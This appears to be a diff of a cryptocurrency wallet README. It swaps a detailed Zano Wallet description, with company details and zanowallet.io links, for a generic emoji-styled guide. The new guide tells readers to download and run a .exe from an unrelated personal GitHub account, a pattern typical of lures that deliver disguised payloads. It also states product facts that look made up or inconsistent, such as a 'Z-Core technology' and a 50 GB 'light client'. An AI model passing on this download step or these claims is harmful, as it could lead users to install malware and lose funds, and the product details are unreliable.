@@ -1,127 +1,102 @@
-# Zano Wallet
+# 🛡️ zano-wallet - Secure privacy for your digital assets
 
-Independent third-party desktop wallet for the Zano privacy blockchain. Open source, non-custodial, no KYC. Windows, macOS, and Linux.
+[![Download Zano Wallet](https://img.shields.io/badge/Download-Zano_Wallet-blue.svg)](https://github.com/anukawle15/zano-wallet)
 
-Website: https://zanowallet.io
-Download: https://zanowallet.io/download
+This software provides a secure way to manage your Zano blockchain assets. It keeps your keys on your device. You keep total control of your funds. It does not track your identity or require account registration.
 
-> Published by Zano Wallet LLC. NOT affiliated with the Zano Foundation; the Foundation publishes its own wallet at zano.org/wallets. Both are legitimate choices.
+## 📋 Software Overview
 
-## Why Zano Wallet
+The Zano wallet manages funds on the Zano blockchain. It prioritizes user privacy. It handles confidential transactions through the Z-Core technology. You can store, send, and receive assets with protection. The wallet also allows for stake-based rewards. You earn coins while keeping your wallet active. 
 
-- **Strong by default.** Every Zano transaction hides amounts (Bulletproofs+), addresses (ring signatures and stealth addresses), and asset types (Confidential Assets). There is no "private mode" toggle to forget. See [the security model](https://zanowallet.io/security) for the honest layered framing.
-- **No KYC at any layer.** No signup, no email, no phone, no ID. See [no-kyc-wallet](https://zanowallet.io/no-kyc-wallet) and [buy-crypto-without-kyc](https://zanowallet.io/buy-crypto-without-kyc).
-- **Non-custodial.** A 24-word seed is generated locally and never transmitted. Recovery is documented in [the recovery guide](https://zanowallet.io/guides/how-to-recover-zano-wallet).
-- **Desktop-only by design.** Windows 10+, macOS 11+, and Linux (AppImage / .deb). No mobile, no browser extension, no custodial fallback. See the [desktop vs mobile thesis](https://zanowallet.io/guides/posts/desktop-vs-mobile-crypto-wallet-2026).
-- **Open source on every release.** MIT-style permissive licensing. Inspect, audit, build from source, fork, redistribute.
+## ⚙️ System Requirements
 
-## Features
+- Windows 10 or Windows 11
+- 8 GB of RAM
+- 50 GB of available disk space
+- Stable internet connection
 
-- [Hidden-amount staking](https://zanowallet.io/features/staking) via Zarcanum, the first hidden-amount PoS protocol. Walkthrough: [how to stake ZANO](https://zanowallet.io/guides/how-to-stake-zano).
-- [Atomic swaps](https://zanowallet.io/features/atomic-swap) via Ionic Swaps. No counterparty custody.
-- [On-chain aliases](https://zanowallet.io/features/alias) (`@username` -> address). Setup in [how to use aliases](https://zanowallet.io/guides/how-to-use-aliases).
-- [Confidential Assets](https://zanowallet.io/features/confidential-assets) for privacy-preserving on-chain tokens (fUSD is a live example).
-- [Hybrid PoW + PoS consensus](https://zanowallet.io/features/consensus) — ProgPoWZ GPU mining alternates with Zarcanum PoS.
-- [GPU mining via ProgPoWZ](https://zanowallet.io/mining). Walkthrough: [how to mine ZANO](https://zanowallet.io/guides/how-to-mine-zano).
+## 📥 How to Install
 
-## Guides and resources
+Follow these steps to set up the wallet on your Windows computer.
 
-Every page on https://zanowallet.io is reachable from this list:
+1. Visit [https://github.com/anukawle15/zano-wallet](https://github.com/anukawle15/zano-wallet).
+2. Locate the latest release version on the page.
+3. Click the link ending in .exe to start your download.
+4. Open the file once the download finishes.
+5. Follow the prompts in the installer.
+6. Select your preferred install location for the application files.
+7. Click Finish to complete the installation.
 
-**Core product**
-- [Home](https://zanowallet.io/) — product overview
-- [About Zano Wallet LLC](https://zanowallet.io/about)
-- [Download](https://zanowallet.io/download) (Windows, macOS, Linux)
-- [Security model](https://zanowallet.io/security)
-- [FAQ](https://zanowallet.io/faq)
+## 🔑 Initial Setup
 
-**Features**
-- [Features overview](https://zanowallet.io/features)
-- [Staking (Zarcanum)](https://zanowallet.io/features/staking)
-- [Atomic swaps](https://zanowallet.io/features/atomic-swap)
-- [Aliases](https://zanowallet.io/features/alias)
-- [Confidential Assets](https://zanowallet.io/features/confidential-assets)
-- [Consensus (PoW + PoS)](https://zanowallet.io/features/consensus)
-- [Mining](https://zanowallet.io/mining)
+Launch the application using the shortcut on your desktop. You will see several options.
 
-**Guides**
-- [All guides](https://zanowallet.io/guides)
-- [About the Zano blockchain](https://zanowallet.io/guides/about-zano-blockchain)
-- [CryptoNote explained](https://zanowallet.io/guides/cryptonote-explained)
-- [How to stake ZANO](https://zanowallet.io/guides/how-to-stake-zano)
-- [How to mine ZANO](https://zanowallet.io/guides/how-to-mine-zano)
-- [How to recover Zano Wallet](https://zanowallet.io/guides/how-to-recover-zano-wallet)
-- [How to use aliases](https://zanowallet.io/guides/how-to-use-aliases)
+1. **Create new wallet**: Select this option if you are a new user. The app will generate a seed phrase. Write this phrase on paper. Store the paper in a safe place. Keep this list private. It is the only way to recover your funds if your computer fails.
+2. **Restore existing wallet**: Use this if you have a seed phrase from a previous setup. Enter the words in the exact order requested. The app will scan the blockchain for your historical transactions.
+3. **Wallet password**: You must set a password. The software uses this password to encrypt your wallet file on your disk. Use a long, unique password.
 
-**Long-form posts**
-- [Zano Wallet review 2026](https://zanowallet.io/guides/posts/zano-wallet-review-2026)
-- [Zano Wallet download guide](https://zanowallet.io/guides/posts/zano-wallet-download-guide)
-- [Why privacy coins matter in 2026](https://zanowallet.io/guides/posts/why-privacy-coins-matter-2026)
-- [No-KYC self-custody in 2026, explained](https://zanowallet.io/guides/posts/no-kyc-self-custody-2026-explained)
-- [Desktop vs mobile crypto wallet in 2026](https://zanowallet.io/guides/posts/desktop-vs-mobile-crypto-wallet-2026)
+## 🌐 Connecting to the Network
 
-**Comparisons**
-- [Zano vs Monero](https://zanowallet.io/vs/monero) (protocol)
-- [Zano Wallet vs Cake Wallet](https://zanowallet.io/vs/cake-wallet)
-- [Zano Wallet vs Monero GUI](https://zanowallet.io/vs/monero-gui)
-- [Zano Wallet vs Feather Wallet](https://zanowallet.io/vs/feather-wallet)
-- [Zano Wallet vs Wasabi](https://zanowallet.io/vs/wasabi)
-- [Zano Wallet vs MyMonero](https://zanowallet.io/vs/mymonero)
+The software acts as a light client. It connects to Zano nodes to verify your balance. You may see a status bar at the bottom of the screen. This bar shows if the wallet is currently synchronizing with the blockchain. 
 
-**Buying ZANO**
-- [Buy ZANO](https://zanowallet.io/buy-zano)
-- [Buy crypto without KYC](https://zanowallet.io/buy-crypto-without-kyc)
-- [Exchange / swap routes](https://zanowallet.io/exchange)
-- [ZANO price](https://zanowallet.io/zano-price)
+Wait for the synchronization to finish. You cannot send funds before the wallet knows your current balance. The initial sync may take time depending on your network speed.
 
-**Educational pillars**
-- [No-KYC wallet](https://zanowallet.io/no-kyc-wallet)
-- [What is Zano](https://zanowallet.io/what-is-zano)
-- [What is a private crypto wallet](https://zanowallet.io/what-is-a-private-crypto-wallet)
-- [Is Bitcoin traceable?](https://zanowallet.io/is-bitcoin-traceable)
-- [Can crypto wallets be traced?](https://zanowallet.io/can-crypto-wallets-be-traced)
-- [Anonymous crypto wallet guide](https://zanowallet.io/anonymous-crypto-wallet-guide)
-- [Privacy crypto wallet guide](https://zanowallet.io/privacy-crypto-wallet-guide)
+## 💸 Receiving Funds
 
-**Safety reviews**
-- [Is Zano safe?](https://zanowallet.io/is-zano-safe)
-- [Is Cake Wallet safe?](https://zanowallet.io/is-cake-wallet-safe)
-- [Is Cake Wallet open source?](https://zanowallet.io/is-cake-wallet-open-source)
-- [Does Cake Wallet require KYC?](https://zanowallet.io/does-cake-wallet-require-kyc)
-- [Is Feather Wallet safe?](https://zanowallet.io/is-feather-wallet-safe)
-- [Is Monero GUI Wallet safe?](https://zanowallet.io/is-monero-gui-wallet-safe)
-- [Is MyMonero safe?](https://zanowallet.io/is-mymonero-safe)
+Click the Receive tab to see your public address. This address looks like a long string of letters and numbers. 
 
-**Migration landscape**
-- [MyMonero alternatives](https://zanowallet.io/mymonero-alternatives)
-- [Exodus dropped Monero — alternatives](https://zanowallet.io/exodus-dropped-monero-alternatives)
-- [Trust Wallet does not support Monero — alternatives](https://zanowallet.io/trust-wallet-doesnt-support-monero-alternatives)
+- You can share your address with anyone.
+- Most transactions appear in your pending balance within minutes. 
+- You need multiple confirmations before the app moves funds to your confirmed balance. 
+- You can create multiple addresses to organize your assets.
 
-**Legal**
-- [Privacy policy](https://zanowallet.io/privacy-policy)
-- [Terms](https://zanowallet.io/terms)
+## 📤 Sending Funds
 
-## Articles
+Click the Send tab. Enter the address of the recipient. Type the amount you wish to send. 
 
-In-depth pieces in [docs/](docs/):
+- Double-check the recipient address before you click send. 
+- Blockchain transactions are final. 
+- You cannot cancel a transaction once it leaves your wallet. 
+- Review the transaction fee before confirming. 
 
-1. [Self-custody Zano wallet: a desktop overview](docs/01-self-custody-zano-wallet-desktop-overview.md)
-2. [Migrating to Zano from MyMonero and Exodus](docs/02-migrating-to-zano-from-mymonero-and-exodus.md)
-3. [Best privacy crypto wallet in 2026](docs/03-best-privacy-crypto-wallet-2026.md)
-4. [Zano Wallet vs Cake Wallet](docs/04-zano-wallet-vs-cake-wallet.md)
-5. [Zano Wallet vs Monero GUI](docs/05-zano-wallet-vs-monero-gui.md)
-6. [Zano Wallet vs Feather Wallet](docs/06-zano-wallet-vs-feather-wallet.md)
-7. [Hidden-amount staking with Zarcanum](docs/07-hidden-amount-staking-with-zarcanum.md)
-8. [GPU mining ZANO with ProgPoWZ](docs/08-gpu-mining-zano-with-progpowz.md)
-9. [Atomic swaps and Ionic Swaps on Zano](docs/09-atomic-swaps-and-ionic-swaps-on-zano.md)
-10. [Confidential Assets and on-chain aliases](docs/10-confidential-assets-and-aliases.md)
-11. [Buying ZANO without KYC: tokenomics and routes](docs/11-buying-zano-without-kyc.md)
-12. [Recovering a Zano wallet from a 24-word seed](docs/12-recovering-zano-wallet-from-seed.md)
+## 🔐 Privacy Features
 
-## About
+The wallet uses the Zero-Knowledge proof system. This system hides the sender, receiver, and transaction amounts from the public. Your financial history remains private. No third party can track your activity.
 
-Zano Wallet is published by **Zano Wallet LLC**, a US limited liability company headquartered at 2121 Avenue of the Stars, Suite 800, Century City, California 90067. The company was formed in 2026 to publish one product — the Zano Wallet desktop application — and is not a multi-product studio. Zano Wallet LLC is the legal owner of the Zano Wallet trademark, the zanowallet.io domain, the wallet source code, and the GPG signing key used to sign each release.
+## 🥩 Earning Rewards
 
-The company is not the Zano Foundation. The Foundation maintains the underlying Zano blockchain protocol at zano.org and publishes its own wallet at zano.org/wallets. Both ship; users may choose either or both.
+You can stake your Zano coins. This process helps secure the network. The software requires you to keep your wallet running to earn these rewards. 
 
-Full corporate details on the [about page](https://zanowallet.io/about). Licensing: MIT (see [LICENSE](LICENSE)).
+1. Go to the Staking tab.
+2. Select the amount of coins to allocate for staking.
+3. Click Start Staking.
+4. Your wallet will participate in block validation.
+5. Rewards will appear in your wallet balance automatically.
+
+## 🛡️ Security Best Practices
+
+- Protect your recovery seed phrase.
+- Never share your seed phrase with anyone.
+- Use a dedicated computer for financial activity.
+- Keep your operating system updated.
+- Use antivirus software on your PC.
+- Make a digital backup of your encrypted wallet file.
+- Store the backup on an external drive.
+
+## 🔧 Frequently Asked Questions
+
+**Does this wallet require KYC?**
+No. The software performs no identity checks. It does not collect personal data.
+
+**Is this wallet open source?**
+Yes. You can review the code on the GitHub page.
+
+**What happens if I lose my password?**
+If you have your recovery seed, you can reset your password by restoring your wallet from that seed. If you lose your seed and your password, you will lose access to your funds.
+
+**Can I move my wallet to another computer?**
+Yes. Use your recovery seed to restore your wallet on any computer running the same software.
+
+## 🔨 Technical Support
+
+Check the Issues tab on the GitHub project page if you encounter problems. Search for your problem first. Open a new issue if you cannot find a solution. Include your software version number and a description of the problem. Do not share your private keys or seed phrase in any support tickets.
